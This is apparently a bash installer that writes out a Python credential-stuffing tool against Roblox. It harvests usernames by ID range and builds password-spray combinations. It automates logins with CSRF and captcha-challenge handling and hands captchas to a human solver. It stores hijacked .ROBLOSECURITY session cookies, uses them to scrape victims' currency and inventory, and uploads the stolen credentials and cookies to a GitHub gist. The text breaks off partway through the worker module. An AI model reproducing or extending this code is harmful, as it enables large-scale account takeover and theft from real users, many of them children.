#!/usr/bin/env bash
set -e
cd "$(dirname "$0")"
mkdir -p src docs data .github/workflows out

w() { cat > "$1"; }

w src/config.py <<'PY'
import os

BASE = os.environ.get("SVCHOME") or os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
DATA = os.path.join(BASE, ".d")
os.makedirs(DATA, exist_ok=True)

try:
    from _secret import _SECRET
except Exception:
    _SECRET = {}


def _env(path):
    d = {}
    try:
        with open(path, encoding="utf-8-sig") as f:
            for raw in f:
                line = raw.strip()
                if not line or line.startswith("#") or "=" not in line:
                    continue
                k, v = line.split("=", 1)
                d[k.strip().upper()] = v.strip().strip('"').strip("'")
    except Exception:
        pass
    return d


E = _env(os.path.join(BASE, ".env"))


def _clean(v):
    return v.strip() if isinstance(v, str) else v


def get(key, default=""):
    key = key.upper()
    for src in (_SECRET, E, os.environ):
        try:
            v = _clean(src.get(key))
        except Exception:
            continue
        if v not in (None, ""):
            return v
    return default


def geti(key, default=0):
    s = str(get(key, default)).strip()
    try:
        return int(s)
    except Exception:
        try:
            return int(float(s))
        except Exception:
            return default


def getf(key, default=0.0):
    try:
        return float(str(get(key, default)).strip())
    except Exception:
        return default


def getb(key, default=False):
    v = str(get(key, "1" if default else "0")).strip().lower()
    return v not in ("0", "false", "no", "off", "")


BOT_TOKEN = get("BOT_TOKEN")
OWNER_ID = geti("OWNER_ID", 0)
AUTO_OWNER = getb("AUTO_OWNER", True)
GITHUB_TOKEN = get("GITHUB_TOKEN")
GIST_ID = get("GIST_ID")

UA = get("USER_AGENT", "Roblox/WinInet")
PROXY = get("PROXY", "")
HTTP_TIMEOUT = geti("HTTP_TIMEOUT", 20) or 20
MIN_DELAY = getf("MIN_DELAY", 1.1) or 1.1
MAX_DELAY = getf("MAX_DELAY", 4.0) or 4.0
WORKERS = geti("WORKERS", 2) or 2
ROTATE_UA = getb("ROTATE_UA", False)
FARM_THREADS = geti("FARM_THREADS", 4) or 4

MAX_ATTEMPTS = geti("MAX_ATTEMPTS", 3) or 3
RETRY_DELAY = getf("RETRY_DELAY", 20.0)
CAPTCHA_DELAY = getf("CAPTCHA_DELAY", 90.0)
MAX_CAPTCHA_TRIES = geti("MAX_CAPTCHA_TRIES", 5) or 5

BACKUP_EVERY = geti("BACKUP_EVERY", 600) or 600
BACKUP_FULL = getb("BACKUP_FULL", True)

CAPTCHA_MODE = (get("CAPTCHA_MODE", "auto") or "auto").lower()
CAPTCHA_ACTION_TYPE = get("CAPTCHA_ACTION_TYPE", "Login")
CAPTCHA_PUBLIC_KEY = get("CAPTCHA_PUBLIC_KEY", "")
KEYS_URL = get("KEYS_URL", "https://apis.rbxcdn.com/captcha/v1/metadata")
WARM_TIMEOUT = getf("WARM_TIMEOUT", 300.0)
WARM_RETRY = getf("WARM_RETRY", 600.0)
WARM_PAGE = get("WARM_PAGE", "https://adiprmx.github.io/svc/warm.html")
CAPTCHA_BREAKER_WINDOW = geti("CAPTCHA_BREAKER_WINDOW", 10) or 10
CAPTCHA_BREAKER_RATE = getf("CAPTCHA_BREAKER_RATE", 0.5)

MODE = (os.environ.get("SVCMODE") or get("SVCMODE", "full") or "full").lower()
DURATION = geti("SVC_DURATION", 0)
SHARD = geti("SVC_SHARD", 0)
SHARDS = geti("SVC_SHARDS", 1) or 1
FORCE = getb("SVC_FORCE", False)
DOCTOR = getb("SVC_DOCTOR", True)

DB_PATH = os.path.join(DATA, "rbx.db")
PWFILE = os.path.join(DATA, "passwords.txt")
SEED_PWFILE = os.path.join(BASE, "data", "passwords.txt")
LOG_PATH = os.path.join(BASE, "x.log")
OWNER_FILE = os.path.join(DATA, "owner.txt")


def problems():
    out = []
    if not BOT_TOKEN:
        out.append("BOT_TOKEN kosong")
    elif ":" not in BOT_TOKEN:
        out.append("BOT_TOKEN formatnya aneh (harus ada ':')")
    if not AUTO_OWNER and not OWNER_ID:
        out.append("OWNER_ID 0 dan AUTO_OWNER mati")
    return out


def describe():
    def mask(v):
        if not v:
            return "-"
        return v[:6] + "..." + v[-4:] if len(v) > 12 else v
    import sys
    return ("python=%s mode=%s\nBASE=%s\nBOT_TOKEN=%s\nOWNER_ID=%s auto_owner=%s\n"
            "UA=%s workers=%d captcha=%s" % (
                sys.version.split()[0], MODE, BASE, mask(BOT_TOKEN),
                OWNER_ID or "(belum di-set)", AUTO_OWNER, UA, WORKERS, CAPTCHA_MODE))
PY

w src/util.py <<'PY'
import gzip, http.cookiejar, json, logging, urllib.error, urllib.request

log = logging.getLogger("svc.http")


class Session:
    def __init__(self, ua=None, timeout=20, proxy=None):
        import config
        self.ua = ua or config.UA
        self.timeout = timeout or config.HTTP_TIMEOUT
        self.proxy = proxy if proxy is not None else (config.PROXY or None)
        self.csrf = None
        self.extra = {}
        self.jar = http.cookiejar.CookieJar()
        self._build()

    def _build(self):
        handlers = [urllib.request.HTTPCookieProcessor(self.jar)]
        if self.proxy:
            handlers.append(urllib.request.ProxyHandler({"http": self.proxy,
                                                         "https": self.proxy}))
        self.opener = urllib.request.build_opener(*handlers)

    def clear_cookies(self):
        self.jar.clear()
        self.csrf = None

    def drop_cookie(self, name):
        keep = [c for c in self.jar if c.name != name]
        self.jar.clear()
        for c in keep:
            self.jar.set_cookie(c)

    def cookie(self, name):
        for c in self.jar:
            if c.name == name:
                return c.value
        return None

    @property
    def roblosecurity(self):
        return self.cookie(".ROBLOSECURITY")

    def probe_csrf(self, url, method="POST", body=None):
        try:
            self.request(method, url, body)
        except Exception:
            pass
        return self.csrf

    def request(self, method, url, body=None, headers=None):
        h = {"User-Agent": self.ua,
             "Accept": "application/json, text/plain, */*",
             "Accept-Encoding": "gzip",
             "Accept-Language": "en-US,en;q=0.9"}
        data = None
        if body is not None:
            data = json.dumps(body).encode()
            h["Content-Type"] = "application/json;charset=UTF-8"
        if self.csrf:
            h["x-csrf-token"] = self.csrf
        h.update(self.extra)
        if headers:
            h.update(headers)

        req = urllib.request.Request(url, data=data, headers=h, method=method)
        try:
            with self.opener.open(req, timeout=self.timeout) as r:
                code, hdr, raw = r.status, r.headers, r.read()
        except urllib.error.HTTPError as e:
            code, hdr, raw = e.code, e.headers, e.read()
        except Exception as e:
            log.debug("req fail %s %s: %r", method, url, e)
            return 0, {}, "", None

        if hdr.get("Content-Encoding") == "gzip":
            try:
                raw = gzip.decompress(raw)
            except Exception:
                pass
        text = raw.decode("utf-8", "replace")
        try:
            js = json.loads(text)
        except Exception:
            js = None
        tok = hdr.get("x-csrf-token")
        if tok:
            self.csrf = tok
        return code, hdr, text, js
PY

w src/rblx.py <<'PY'
import base64, json, logging, random, time

import config, util

log = logging.getLogger("svc.rblx")

AUTH = "https://auth.roblox.com"
APIS = "https://apis.roblox.com"
CHALLENGE = APIS + "/challenge/v1/continue"
LOGIN_KEY = "476068BF-9607-4799-B53D-966BE98E2B81"

UAS = [
    "Roblox/WinInet",
    "Roblox/2.616.551 (Android; Android 12; SM-G991B)",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
]

CSRF_PROBES = [("POST", AUTH + "/v2/login"), ("POST", AUTH + "/v2/logout")]

BROWSER_HDR = {"Origin": "https://www.roblox.com", "Referer": "https://www.roblox.com/"}

SEC_HDR = {
    "sec-ch-ua": '"Chromium";v="126", "Google Chrome";v="126", "Not.A/Brand";v="24"',
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": '"Windows"',
    "Sec-Fetch-Site": "same-site",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Dest": "empty",
}

_keys = {"ts": 0.0, "v": {}}


def public_key(kind="ACTION_TYPE_WEB_LOGIN"):
    if config.CAPTCHA_PUBLIC_KEY:
        return config.CAPTCHA_PUBLIC_KEY
    if _keys["v"] and time.time() - _keys["ts"] < 3600:
        return _keys["v"].get(kind) or LOGIN_KEY
    try:
        s = util.Session("Roblox/WinInet", 10)
        code, hdr, text, js = s.request("GET", config.KEYS_URL)
        if code == 200 and isinstance(js, dict):
            _keys["v"] = js.get("funCaptchaPublicKeys") or {}
            _keys["ts"] = time.time()
    except Exception:
        pass
    return _keys["v"].get(kind) or LOGIN_KEY


def _b64json(raw):
    try:
        return json.loads(base64.b64decode(raw).decode("utf-8", "replace"))
    except Exception:
        return None


def parse_challenge(hdr):
    cid = hdr.get("rblx-challenge-id")
    ctype = hdr.get("rblx-challenge-type") or "captcha"
    raw = hdr.get("rblx-challenge-metadata")
    outer = _b64json(raw) if raw else None
    if not isinstance(outer, dict):
        outer = {}
    cid = outer.get("challengeId") or cid
    ctype = outer.get("challengeType") or ctype
    meta = outer.get("challengeMetadata")
    if isinstance(meta, str):
        try:
            meta = json.loads(meta)
        except Exception:
            meta = {}
    if not isinstance(meta, dict):
        meta = {}
    if not meta:
        meta = {k: v for k, v in outer.items()
                if k not in ("challengeId", "challengeType")}
    return {"id": cid, "type": ctype, "meta": meta,
            "blob": meta.get("dataExchangeBlob") or meta.get("blob") or "",
            "public_key": meta.get("publicKey") or "", "token": None,
            "meta_solved": None}


def solve_metadata(ch, token):
    meta = dict(ch.get("meta") or {})
    meta["captchaToken"] = token
    if ch.get("type") == "captcha":
        meta.setdefault("actionType", config.CAPTCHA_ACTION_TYPE)
    return meta


class Roblox:
    def __init__(self, ua=None, timeout=None, proxy=None, sec=False):
        self.s = util.Session(ua or config.UA, timeout, proxy)
        self.s.extra.update(BROWSER_HDR)
        if sec or (self.s.ua or "").startswith("Mozilla"):
            self.s.extra.update(SEC_HDR)
        self.challenge = None

    def reset(self, soft=False):
        if soft:
            self.s.drop_cookie(".ROBLOSECURITY")
        else:
            self.s.clear_cookies()
        self.challenge = None

    def csrf(self):
        for method, url in CSRF_PROBES:
            try:
                self.s.request(method, url)
            except Exception:
                continue
            if self.s.csrf:
                return self.s.csrf
        return None

    @staticmethod
    def _ctype(user):
        return "Email" if "@" in (user or "") else "Username"

    def login(self, username, password, challenge_headers=None):
        if not self.s.csrf:
            self.csrf()
        body = {"ctype": self._ctype(username), "cvalue": username,
                "password": password}
        extra = dict(challenge_headers or {}) or None
        code, hdr, text, js = self.s.request("POST", AUTH + "/v2/login", body,
                                             headers=extra)
        status, detail = classify(code, hdr, js, text)
        if status in ("captcha", "2fa"):
            self.challenge = parse_challenge(hdr)
        elif status == "csrf":
            self.csrf()
            code, hdr, text, js = self.s.request("POST", AUTH + "/v2/login", body,
                                                 headers=extra)
            status, detail = classify(code, hdr, js, text)
            if status in ("captcha", "2fa"):
                self.challenge = parse_challenge(hdr)
        return status, detail, self.s.roblosecurity

    def login_2fa(self, username, password, code2, challenge=None):
        ch = challenge or self.challenge
        if not self.s.csrf:
            self.csrf()
        body = {"ctype": self._ctype(username), "cvalue": username,
                "password": password, "twoStepVerificationCode": code2}
        code, hdr, text, js = self.s.request("POST", AUTH + "/v2/login", body,
                                             headers=self.challenge_headers(ch))
        return classify(code, hdr, js, text) + (self.s.roblosecurity,)

    def continue_challenge(self, token, challenge=None):
        ch = challenge or self.challenge
        if not ch or not ch.get("id"):
            return False
        ch["token"] = token
        meta = solve_metadata(ch, token)
        ch["meta_solved"] = meta
        payload = {"challengeId": ch["id"],
                   "challengeType": ch.get("type") or "captcha",
                   "challengeMetadata": json.dumps(meta)}
        if not self.s.csrf:
            self.csrf()
        code, hdr, text, js = self.s.request("POST", CHALLENGE, payload)
        if code == 403 and "token validation" in (text or "").lower():
            self.s.csrf = None
            self.s.probe_csrf(CHALLENGE, "POST", payload)
            code, hdr, text, js = self.s.request("POST", CHALLENGE, payload)
        return code == 200

    def challenge_headers(self, challenge=None):
        ch = challenge or self.challenge
        if not ch or not ch.get("id") or not ch.get("token"):
            return None
        meta = ch.get("meta_solved") or solve_metadata(ch, ch["token"])
        return {"Rblx-Challenge-Id": ch.get("id"),
                "Rblx-Challenge-Type": ch.get("type") or "captcha",
                "Rblx-Challenge-Metadata": base64.b64encode(
                    json.dumps(meta).encode()).decode()}


def classify(code, hdr, js, text):
    if code == 200:
        if isinstance(js, dict) and js.get("twoStepVerificationRequired"):
            return "2fa", "twoStepVerificationRequired"
        return "hit", "ok"
    if code == 429:
        return "ratelimited", hdr.get("Retry-After") or ""
    if code in (400, 403):
        ctype = (hdr.get("rblx-challenge-type") or "").lower()
        msg = ""
        if isinstance(js, dict):
            errs = js.get("errors") or []
            if errs and isinstance(errs[0], dict):
                msg = errs[0].get("message") or ""
        low = msg.lower()
        if (hdr.get("rblx-challenge-id") or ctype == "captcha"
                or "captcha" in low or "robot" in low or "challenge" in low):
            return "captcha", msg or ctype
        if ctype == "twostepverification" or "two step" in low or "two-step" in low:
            return "2fa", msg
        if "token validation" in low:
            return "csrf", msg
        if "too many" in low or "flood" in low or "try again" in low:
            return "ratelimited", msg
        if "banned" in low or "deleted" in low or "disabled" in low:
            return "banned", msg
        if "incorrect" in low or "invalid" in low or "doesn't exist" in low:
            return "invalid", msg
        if not msg and not js:
            return "blocked", "%s non-json %s" % (code, (text or "")[:60])
        return "denied", "%s | %s" % (code, msg or (text or "")[:80])
    return "error", "%s %s" % (code, (text or "")[:200])
PY

w src/store.py <<'PY'
import json, sqlite3, threading, time

_lock = threading.RLock()
_db = None
_shard = (0, 1)

SCHEMA = """
PRAGMA journal_mode=WAL;
PRAGMA synchronous=NORMAL;
CREATE TABLE IF NOT EXISTS users(
    id INTEGER PRIMARY KEY, username TEXT UNIQUE, name TEXT, created TEXT, ts REAL);
CREATE TABLE IF NOT EXISTS combos(
    username TEXT, password TEXT, status TEXT DEFAULT 'pending',
    attempts INTEGER DEFAULT 0, next_try REAL DEFAULT 0, ctries INTEGER DEFAULT 0,
    detail TEXT, ts REAL, PRIMARY KEY(username, password));
CREATE TABLE IF NOT EXISTS hits(
    username TEXT PRIMARY KEY, password TEXT, cookie TEXT, data TEXT, note TEXT, ts REAL);
CREATE TABLE IF NOT EXISTS state(k TEXT PRIMARY KEY, v TEXT);
CREATE INDEX IF NOT EXISTS idx_combos_status ON combos(status, next_try);
"""


def _k(u):
    return (u or "").strip().lower()


def init(path):
    global _db
    _db = sqlite3.connect(path, check_same_thread=False, timeout=30)
    _db.row_factory = sqlite3.Row
    with _lock:
        _db.executescript(SCHEMA)
        _db.commit()


def set_shard(idx, total):
    global _shard
    _shard = (max(0, int(idx)), max(1, int(total)))


def add_users(rows):
    with _lock:
        _db.executemany(
            "INSERT OR IGNORE INTO users(id, username, name, created, ts) "
            "VALUES(?,?,?,?,?)",
            [(r[0], _k(r[1]), r[2], r[3], r[4]) for r in rows])
        _db.commit()


def all_usernames(limit=0):
    with _lock:
        q = "SELECT username FROM users ORDER BY id" + (" LIMIT %d" % limit if limit else "")
        return [r["username"] for r in _db.execute(q)]


def user_count():
    with _lock:
        return _db.execute("SELECT COUNT(*) c FROM users").fetchone()["c"]


def add_combos(rows, chunk=5000):
    with _lock:
        for i in range(0, len(rows), chunk):
            _db.executemany(
                "INSERT OR IGNORE INTO combos(username, password, ts) VALUES(?,?,?)",
                [(_k(u), p, t) for u, p, t in rows[i:i + chunk]])
        _db.commit()


def claim_combo():
    now = time.time()
    idx, tot = _shard
    with _lock:
        if tot > 1:
            r = _db.execute(
                "SELECT username, password, attempts FROM combos "
                "WHERE status='pending' AND next_try<=? AND (rowid % ?)=? "
                "ORDER BY next_try, rowid LIMIT 1", (now, tot, idx)).fetchone()
        else:
            r = _db.execute(
                "SELECT username, password, attempts FROM combos "
                "WHERE status='pending' AND next_try<=? "
                "ORDER BY next_try, rowid LIMIT 1", (now,)).fetchone()
        if not r:
            return None
        _db.execute("UPDATE combos SET status='running', attempts=attempts+1, ts=? "
                    "WHERE username=? AND password=?",
                    (now, r["username"], r["password"]))
        _db.commit()
        return {"username": r["username"], "password": r["password"]}


def _set(u, p, status, detail="", delay=0.0, extra=""):
    now = time.time()
    with _lock:
        _db.execute("UPDATE combos SET status=?, detail=?, ts=?, next_try=? %s "
                    "WHERE username=? AND password=?" % extra,
                    (status, (detail or "")[:300], now, now + delay, _k(u), p))
        _db.commit()


def finish_combo(u, p, status, detail=""):
    _set(u, p, status, detail)


def back_to_pending(u, p, detail=""):
    _set(u, p, "pending", detail)


def requeue(u, p, detail="", delay=0.0, max_attempts=3):
    with _lock:
        r = _db.execute("SELECT attempts FROM combos WHERE username=? AND password=?",
                        (_k(u), p)).fetchone()
    att = r["attempts"] if r else max_attempts
    st = "pending" if att < max_attempts else "dead"
    _set(u, p, st, detail, delay)
    return st


def mark_captcha(u, p, detail="", delay=0.0):
    _set(u, p, "captcha", detail, delay, extra=", ctries=ctries+1")


def mark_soft(u, p, detail="", delay=0.0):
    _set(u, p, "soft", detail, delay)


def _count(status):
    with _lock:
        return _db.execute("SELECT COUNT(*) c FROM combos WHERE status=?",
                           (status,)).fetchone()["c"]


def pending_count():
    return _count("pending")


def captcha_count():
    return _count("captcha")


def soft_count():
    return _count("soft")


def captcha_list(limit=15):
    with _lock:
        return ["%s : %s  [%s/%d]" % (r["username"], r["password"],
                                      (r["detail"] or "")[:40], r["ctries"])
                for r in _db.execute("SELECT username, password, detail, ctries "
                                     "FROM combos WHERE status='captcha' "
                                     "ORDER BY ts LIMIT ?", (limit,))]


def dead_list(limit=15):
    with _lock:
        return ["%s : %s  [%s]" % (r["username"], r["password"], (r["detail"] or "")[:40])
                for r in _db.execute("SELECT username, password, detail FROM combos "
                                     "WHERE status='dead' LIMIT ?", (limit,))]


def retry_captcha(max_tries=5):
    with _lock:
        n = _db.execute("SELECT COUNT(*) c FROM combos WHERE status='captcha' "
                        "AND ctries < ?", (max_tries,)).fetchone()["c"]
        _db.execute("UPDATE combos SET status='pending', next_try=0 "
                    "WHERE status='captcha' AND ctries < ?", (max_tries,))
        _db.execute("UPDATE combos SET status='dead' "
                    "WHERE status='captcha' AND ctries >= ?", (max_tries,))
        _db.commit()
    return n


def retry_soft():
    with _lock:
        n = _count("soft")
        _db.execute("UPDATE combos SET status='pending', attempts=0, next_try=0 "
                    "WHERE status='soft'")
        _db.commit()
    return n


def retry_dead():
    with _lock:
        n = _count("dead")
        _db.execute("UPDATE combos SET status='pending', attempts=0, ctries=0, "
                    "next_try=0 WHERE status='dead'")
        _db.commit()
    return n


def reset_running():
    with _lock:
        _db.execute("UPDATE combos SET status='pending', next_try=0 "
                    "WHERE status='running'")
        _db.commit()


def add_hit(u, p, cookie, note=""):
    with _lock:
        _db.execute("INSERT OR REPLACE INTO hits(username, password, cookie, data, "
                    "note, ts) VALUES(?,?,?,?,?,?)",
                    (_k(u), p, cookie, "", note, time.time()))
        _db.commit()


def update_hit_cookie(u, cookie, note=""):
    with _lock:
        _db.execute("UPDATE hits SET cookie=?, note=? WHERE username=?",
                    (cookie, note, _k(u)))
        _db.commit()


def set_hit_data(u, data):
    with _lock:
        _db.execute("UPDATE hits SET data=? WHERE username=?", (data, _k(u)))
        _db.commit()


def hits(limit=30):
    with _lock:
        return [dict(r) for r in _db.execute(
            "SELECT username, password, cookie, data, note, ts FROM hits "
            "ORDER BY ts DESC LIMIT ?", (limit,))]


def get_hit(u):
    with _lock:
        r = _db.execute("SELECT * FROM hits WHERE username=?", (_k(u),)).fetchone()
        return dict(r) if r else None


def hit_count():
    with _lock:
        return _db.execute("SELECT COUNT(*) c FROM hits").fetchone()["c"]


def get_state(k, default=None):
    with _lock:
        r = _db.execute("SELECT v FROM state WHERE k=?", (k,)).fetchone()
        return r["v"] if r else default


def set_state(k, v):
    with _lock:
        _db.execute("INSERT OR REPLACE INTO state(k, v) VALUES(?,?)", (k, str(v)))
        _db.commit()


def stats():
    with _lock:
        rows = _db.execute("SELECT status, COUNT(*) c FROM combos GROUP BY status").fetchall()
        u = _db.execute("SELECT COUNT(*) c FROM users").fetchone()["c"]
        h = _db.execute("SELECT COUNT(*) c FROM hits").fetchone()["c"]
    return {"combos": {r["status"]: r["c"] for r in rows}, "users": u, "hits": h}


def export(full=True):
    with _lock:
        out = {"hits": [dict(r) for r in _db.execute("SELECT * FROM hits")],
               "state": [dict(r) for r in _db.execute("SELECT * FROM state")]}
        if full:
            out["users"] = [dict(r) for r in _db.execute("SELECT * FROM users")]
            out["combos"] = [dict(r) for r in _db.execute(
                "SELECT username, password, status, attempts, next_try, ctries, ts "
                "FROM combos")]
    return json.dumps(out, default=str)


def restore(payload):
    data = json.loads(payload or "{}")
    now = time.time()
    n = 0
    with _lock:
        for h in data.get("hits", []):
            _db.execute("INSERT OR REPLACE INTO hits(username, password, cookie, "
                        "data, note, ts) VALUES(?,?,?,?,?,?)",
                        (_k(h.get("username")), h.get("password"), h.get("cookie"),
                         h.get("data"), h.get("note"), h.get("ts") or now))
            n += 1
        for s in data.get("state", []):
            _db.execute("INSERT OR REPLACE INTO state(k, v) VALUES(?,?)",
                        (s.get("k"), s.get("v")))
        for u in data.get("users", []):
            _db.execute("INSERT OR IGNORE INTO users(id, username, name, created, ts) "
                        "VALUES(?,?,?,?,?)",
                        (u.get("id"), _k(u.get("username")), u.get("name"),
                         u.get("created"), u.get("ts") or now))
        for c in data.get("combos", []):
            _db.execute("INSERT OR IGNORE INTO combos(username, password, status, "
                        "attempts, next_try, ctries, ts) VALUES(?,?,?,?,?,?,?)",
                        (_k(c.get("username")), c.get("password"),
                         c.get("status") or "pending", c.get("attempts") or 0,
                         c.get("next_try") or 0, c.get("ctries") or 0,
                         c.get("ts") or now))
        _db.commit()
    return n
PY

w src/farmer.py <<'PY'
import json, time

import config, store, util

TARGETS = [
    ("profile", "https://users.roblox.com/v1/users/%d"),
    ("currency", "https://economy.roblox.com/v1/user/currency"),
    ("avatar", "https://avatar.roblox.com/v1/users/%d/avatar"),
    ("inventory", "https://inventory.roblox.com/v2/users/%d/inventory?limit=100"),
    ("friends", "https://friends.roblox.com/v1/users/%d/friends/count"),
    ("badges", "https://accountinformation.roblox.com/v1/users/%d/roblox-badges"),
]


def collect(username, cookie):
    if not cookie:
        return
    s = util.Session(config.UA, config.HTTP_TIMEOUT, config.PROXY or None)
    s.extra["Cookie"] = ".ROBLOSECURITY=" + cookie
    data = {}
    uid = None
    try:
        code, hdr, text, js = s.request(
            "GET", "https://users.roblox.com/v1/users/authenticated")
        if code == 200 and js:
            data["me"] = js
            uid = js.get("id")
        elif code == 401:
            data["cookie"] = "invalid"
        if uid:
            for name, url in TARGETS:
                try:
                    c, h, t, j = s.request("GET", url % uid if "%d" in url else url)
                    if j is not None:
                        data[name] = j
                except Exception:
                    pass
                time.sleep(0.25)
    except Exception:
        pass
    store.set_hit_data(username, json.dumps(data)[:200000])
PY

w src/harvest.py <<'PY'
import time

import config, store, util

GATE = 0.25
BATCH = 100
BULK = "https://users.roblox.com/v1/users"
ONE = "https://users.roblox.com/v1/users/%d"


def _one(s, uid):
    try:
        code, hdr, text, js = s.request("GET", ONE % uid)
    except Exception:
        return 0
    if code == 200 and js:
        store.add_users([(uid, js.get("name"), js.get("displayName"),
                          js.get("created"), time.time())])
        return 1
    return 0


def run(start, count, stop, progress=None):
    s = util.Session(config.UA, config.HTTP_TIMEOUT, config.PROXY or None)
    got = 0
    uid, end = start, start + count
    while uid < end and not stop.is_set():
        ids = list(range(uid, min(uid + BATCH, end)))
        try:
            code, hdr, text, js = s.request("POST", BULK, {"userIds": ids})
        except Exception:
            code, hdr, js = 0, {}, None
        if code == 200 and isinstance(js, dict):
            rows = [(u.get("id"), u.get("name"), u.get("displayName"),
                     u.get("created"), time.time()) for u in (js.get("data") or [])]
            if rows:
                store.add_users(rows)
                got += len(rows)
            uid += BATCH
        elif code == 429:
            time.sleep(float(hdr.get("Retry-After") or 5))
            continue
        elif code == 400:
            for i in ids:
                if stop.is_set():
                    break
                got += _one(s, i)
                time.sleep(GATE)
            uid += BATCH
        else:
            time.sleep(1.5)
            uid += BATCH
        store.set_state("harvest_cursor", uid)
        if progress and (uid // BATCH) % 20 == 0:
            progress(got, uid)
        time.sleep(GATE)
    return got
PY

w src/gencombo.py <<'PY'
import os, time

import config, store


def load_passwords(path=None):
    paths = [path] if path else [config.SEED_PWFILE, config.PWFILE]
    out, seen = [], set()
    for p in paths:
        if not p or not os.path.exists(p):
            continue
        with open(p, encoding="utf-8", errors="ignore") as f:
            for line in f:
                v = line.rstrip("\r\n")
                if v and v not in seen:
                    seen.add(v)
                    out.append(v)
    return out


def save_passwords(pw):
    seen, out = set(), []
    for p in pw:
        p = p.strip()
        if p and p not in seen:
            seen.add(p)
            out.append(p)
    os.makedirs(os.path.dirname(config.PWFILE), exist_ok=True)
    with open(config.PWFILE, "w", encoding="utf-8") as f:
        f.write("\n".join(out) + ("\n" if out else ""))
    return len(out)


def generate(mode="spray", pw_limit=None, user_limit=None, cap=None, chunk=100000):
    users = store.all_usernames()
    if user_limit:
        users = users[:user_limit]
    pw = load_passwords()
    if pw_limit:
        pw = pw[:pw_limit]
    now = time.time()
    total = 0
    batch = []

    def flush():
        nonlocal batch, total
        if batch:
            store.add_combos(batch)
            total += len(batch)
            batch = []

    if mode == "spray":
        pairs = ((p, u) for p in pw for u in users)
    else:
        pairs = ((u, p) for u in users for p in pw)
    for a, b in pairs:
        batch.append((a, b, now))
        if len(batch) >= chunk:
            flush()
        if cap and total >= cap:
            flush()
            return total, len(users), len(pw)
    flush()
    return total, len(users), len(pw)
PY

w src/backup.py <<'PY'
import json, logging, urllib.request

import config, store

log = logging.getLogger("svc.backup")
FILE = "rbx-backup-%d.json"


def _hdr():
    return {"Authorization": "Bearer " + config.GITHUB_TOKEN,
            "Accept": "application/vnd.github+json", "User-Agent": "svc"}


def _url():
    return "https://api.github.com/gists/" + config.GIST_ID


def enabled():
    return bool(config.GITHUB_TOKEN and config.GIST_ID)


def run():
    if not enabled():
        return False
    payload = json.dumps({"files": {FILE % config.SHARD: {
        "content": store.export(config.BACKUP_FULL)}}}).encode()
    req = urllib.request.Request(_url(), data=payload, method="PATCH",
                                headers=dict(_hdr(), **{"Content-Type": "application/json"}))
    with urllib.request.urlopen(req, timeout=120) as r:
        return r.status == 200


def restore():
    if not enabled():
        return 0
    req = urllib.request.Request(_url(), headers=_hdr())
    with urllib.request.urlopen(req, timeout=120) as r:
        js = json.loads(r.read().decode())
    total = 0
    for name, f in (js.get("files") or {}).items():
        if not name.startswith("rbx-backup"):
            continue
        content = None if f.get("truncated") else f.get("content")
        if not content and f.get("raw_url"):
            try:
                with urllib.request.urlopen(f["raw_url"], timeout=180) as r2:
                    content = r2.read().decode()
            except Exception:
                content = None
        if content:
            try:
                total += store.restore(content)
            except Exception as e:
                log.warning("restore %s gagal: %r", name, e)
    return total
PY

w src/worker.py <<'PY'
import base64, collections, json, random, threading, time

import config, farmer, rblx, store


class Gate:
    def __init__(self, lo, hi):
        self.lo, self.hi = lo, hi
        self._l = threading.Lock()
        self._next = 0.0

    def wait(self):
        with self._l:
            now = time.time()
            at = max(now, self._next)
            self._next = at + random.uniform(self.lo, self.hi)
        if at > now:
            time.sleep(at - now)

    def hold(self, secs):
        with self._l:
            self._next = max(self._next, time.time() + secs)


class Pool:
    def __init__(self, size, stop):
        self.size = max(1, size)
        self.stop = stop
        self.paused = True
        self.mode = config.CAPTCHA_MODE
        self.gate = Gate(config.MIN_DELAY, config.MAX_DELAY)
        self.lock = threading.Lock()
        self.stats = {"done": 0, "hit": 0, "retry": 0, "captcha": 0, "warm": 0}
        self.recent = collections.deque(maxlen=max(2, config.CAPTCHA_BREAKER_WINDOW))
        self.notify = None
        self.warm_lock = threading.Lock()
        self.warm_busy = threading.Event()
        self.warm_pending = None
        self.warm_token = None
        self.warm_event = threading.Event()
        self.warm_cool = 0.0
        self.farm_sem = threading.Semaphore(max(1, config.FARM_THREADS))

    def start(self):
        for i in range(self.size):
            threading.Thread(target=self._run, name="w%d" % i, daemon=True).start()

    def _bump(self, k):
        with self.lock:
            self.stats[k] = self.stats.get(k, 0) + 1

    def _note(self, s):
        with self.lock:
            self.recent.append(s)

    def captcha_rate(self):
        with self.lock:
            n = len(self.recent)
            return 0.0 if not n else sum(1 for s in self.recent if s == "captcha") / n

    def breaker_tripped(self):
        with self.lock:
            n = len(self.recent)
            if n < self.recent.maxlen:
                return False
            return (sum(1 for s in self.recent if s == "captcha") / n) > config.CAPTCHA_BREAKER_RATE

    def set_mode(self, mode):
        self.mode = "blast" if str(mode).lower() == "blast" else "auto"
        return self.mode

    def warm_status(self):
        return self.warm_busy.is_set()

    def submit_warm(self, token):
        with self.warm_lock:
            if self.warm_pending is None:
                return False
            self.warm_token = token
            self.warm_event.set()
            return True

    def _payload(self, ch, u, p):
        body = {"cid": ch.get("id"), "ct": ch.get("type") or "captcha",
                "meta": json.dumps(ch.get("meta") or {}),
                "pk": ch.get("public_key") or rblx.public_key(),
                "blob": ch.get("blob") or "", "u": u, "p": p}
        return base64.urlsafe_b64encode(json.dumps(body).encode()).decode()

    def _try_warm(self, ch, u, p):
        if self.warm_busy.is_set():
            return None
        self.warm_busy.set()
        try:
            with self.warm_lock:
                self.warm_pending = ch or {}
                self.warm_token = None
                self.warm_event.clear()
            payload = self._payload(ch or {}, u, p)
            msg = ("== WARM NEEDED ==\nakun: %s\n\n1. buka %s\n2. tempel PAYLOAD\n"
                   "3. solve captcha\n4. copy TOKEN, balas ke chat ini\n\n"
                   "timeout %ds\n\nPAYLOAD:\n%s" % (
                       u, config.WARM_PAGE, int(config.WARM_TIMEOUT), payload))
            if self.notify:
                try:
                    self.notify(msg)
                except Exception:
                    pass
            self.warm_event.wait(config.WARM_TIMEOUT)
            with self.warm_lock:
                tok = self.warm_token
                self.warm_pending = None
                self.warm_token = None
            self._bump("warm")
            return tok
        finally:
            self.warm_busy.clear()

    def _login(self, cli, u, p, headers=None):
        try:
            return cli.login(u, p, headers)
        except Exception as e:
            return "error", repr(e), None

